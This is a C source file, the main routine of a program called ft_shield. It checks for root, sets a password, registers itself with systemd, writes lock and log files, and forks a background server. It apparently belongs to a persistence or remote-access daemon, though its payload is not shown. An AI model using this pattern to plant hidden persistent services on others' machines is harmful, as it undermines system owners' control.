#include "ft_shield.h"

static bool check_sudo() {
	if (getuid()) {
		dprintf(STDERR_FILENO, NEED_SUDO);
		return (false);
	} else {
		return (true);
	}
}

static void del_lock() {
	unlink(LOCK_FILE);
	close_log();
}

static void handle_sigterm() {
	signal(SIGTERM, &del_lock);
}

int main(void) {
	if (!check_sudo() || existing_lock() || !set_password()) {
		return (EXIT_FAILURE);
	}

	systemd();
	create_lock();
	create_log();
	pid_t pid = fork();
	if (pid == -1) {
		perror("fork");
		close_log();
		return (EXIT_FAILURE);
	}

	if (pid == 0) {
		handle_sigterm();
		run_server();
	}

	printf(LOGIN);
	return(EXIT_SUCCESS);
}